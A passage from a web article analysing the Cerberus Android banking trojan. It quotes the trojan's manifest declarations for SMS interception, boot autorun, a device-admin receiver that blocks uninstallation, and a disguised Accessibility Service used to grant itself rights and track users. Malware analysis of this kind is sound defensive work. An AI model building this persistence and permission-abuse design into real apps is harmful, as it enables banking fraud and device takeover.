<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Research of modern Malware Cerberus for Android</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="On the nose of 2020 and today we already have a version of Android 9.0 Pie, where Google is hitting his chest and saying that their product is protect...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Research of modern Malware Cerberus for Android</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/getpro/habr/post_images/5fb/391/192/5fb39119247d45dfa979392da83f34f1.png" alt="image"><br><br>  On the nose of 2020 and today we already have a version of Android 9.0 Pie, where Google is hitting his chest and saying that their product is protected.  But the villains are not asleep and create their own malware for Android. <br><br>  I accidentally got into my hands an obfuscated apk file, which is a banking malware called ‚ÄúCerberus‚Äù, and it appeared in 2019. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      The APK file of this botnet got me with an invalid server connection address, so part of the work logic and functionality remained unexplored, since this botnet uses a ‚Äúmodular‚Äù system and loads the functionality directly from its server. <br><a name="habracut"></a><br><h2>  Analysis apk package </h2><br>  After analyzing the apk-package, I created the structure of the Trojan program: <br><br><ol><li>  Receiver, autorun + alarm; </li><li>  Service, works in a cycle with an interval of 8 seconds, it is responsible for displaying a pop-up message to enable the Accessibility Service, activate the screen lock function and disable administrator rights; </li><li>  Service, collecting data from the sensors of the device, thus the malware received the physical activity of the device; </li><li>  Service, in a cycle, blocks the screen of the device; </li><li>  Service, responsible for data exchange with the server; </li><li>  Activity, loads the html code in the WebView, and shows the contents, serves to replace the activation of the bank application </li><li>  Activity, requests dangerous permissions. </li><li>  Class, keeps the main string (String) of the project </li></ol><br><h2>  Let's start with the manifest </h2><br>  The manifesto of the application is quite interesting, and it is already possible to determine from it that this is not a simple application, but an ordinary malware. <br><br>  For example, consider the permissions for an application: <br><br><pre><code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">uses-permission</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.RECEIVE_BOOT_COMPLETED"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">uses-permission</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.READ_PHONE_STATE"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">uses-permission</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.CALL_PHONE"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">uses-permission</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">uses-permission</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.READ_CONTACTS"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">uses-permission</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.READ_SMS"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">uses-permission</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.INTERNET"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">uses-permission</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.WAKE_LOCK"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">uses-permission</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.SEND_SMS"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">uses-permission</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.RECEIVE_SMS"</span></span></span><span class="hljs-tag">/&gt;</span></span></code> </pre> <br>  Here you can see that the application gets access to SMS, contacts, calls, the Internet, the application works in sleep mode. <br><br>  We go further, and we see privileges that allow the application to become the main one for receiving / sending SMS, this is the villains use to hide SMS messages on the victims' phones. <br><br><pre> <code class="xml hljs"> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">activity</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"com.wfozbladhvnk.ibvtgx.iExuCRAHNmEv"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">data</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:scheme</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"sms"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.intent.action.SENDTO"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">data</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:scheme</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"smsto"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.intent.action.SEND"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">activity</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">receiver</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"com.wfozbladhvnk.ibvtgx.lThcZejcCFe"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:permission</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.BROADCAST_WAP_PUSH"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">data</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:mimeType</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"application/vnd.wap.mms-message"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.provider.Telephony.WAP_PUSH_DELIVER"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">receiver</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">service</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"com.wfozbladhvnk.ibvtgx.UwLgqh"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:permission</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.SEND_RESPOND_VIA_MESSAGE"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">data</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:scheme</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"sms"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.intent.action.RESPOND_VIA_MESSAGE"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">data</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:scheme</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"smsto"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">service</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  And of course the Receiver, it serves for autorun services, and SMS interception. <br><br><pre> <code class="xml hljs"> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">receiver</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"com.wfozbladhvnk.ibvtgx.wtawxrmdzej.oClFeoEgobr"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:permission</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.BROADCAST_SMS"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:priority</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"979"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.intent.action.QUICKBOOT_POWERON"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"com.htc.intent.action.QUICKBOOT_POWERON"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.intent.action.PACKAGE_ADDED"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.intent.action.USER_PRESENT"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.intent.action.PACKAGE_REMOVED"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.provider.Telephony.SMS_RECEIVED"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.provider.Telephony.SMS_DELIVER"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.intent.action.BOOT_COMPLETED"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">receiver</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  Admin rights, this is much more interesting.  The application needs them to block the deletion of the application (if the administrator rights are enabled, the application will not have a ‚Äúdelete‚Äù button), these rights will also allow you to delete everything from the device, block the device. <br><br><pre> <code class="xml hljs"> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">activity</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:theme</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"@style/Theme.NoDisplay"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:label</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">""</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"com.wfozbladhvnk.ibvtgx.hwefoncq.ZQoykALT"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:excludeFromRecents</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"true"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">receiver</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:label</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"System Driver"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"com.wfozbladhvnk.ibvtgx.hwefoncq.LuMBTH"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:permission</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.BIND_DEVICE_ADMIN"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">meta-data</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.app.device_admin"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:resource</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"@xml/ypqvk"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:priority</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"121"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.app.action.DEVICE_ADMIN_ENABLED"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.app.action.DEVICE_ADMIN_DISABLED"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.app.action.ACTION_DEVICE_ADMIN_DISABLE_REQUESTED"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">receiver</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  Well, the most interesting thing is the Accessibility Service.  It is used so that the malware can click on the screen itself and give itself the necessary permissions, including the admin rights.  Through this permission, attackers track all user activity on the device. <br><br><pre> <code class="xml hljs"> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">service</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:label</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Flash Player Service"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"com.wfozbladhvnk.ibvtgx.iyqvybm.BEUZLDTj"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:permission</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.BIND_ACCESSIBILITY_SERVICE"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.accessibilityservice.AccessibilityService"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">meta-data</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.accessibilityservice"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:resource</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"@xml/ikxclmrgfqap"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">service</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  Well, the rest of the services and activations that are not of particular interest without a valid Malvari server address. <br><br><pre> <code class="xml hljs"> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">activity</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:label</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"mhudtqw"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"com.wfozbladhvnk.ibvtgx.wsdckwoau"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">service</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"com.wfozbladhvnk.ibvtgx.coimtetkf"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span 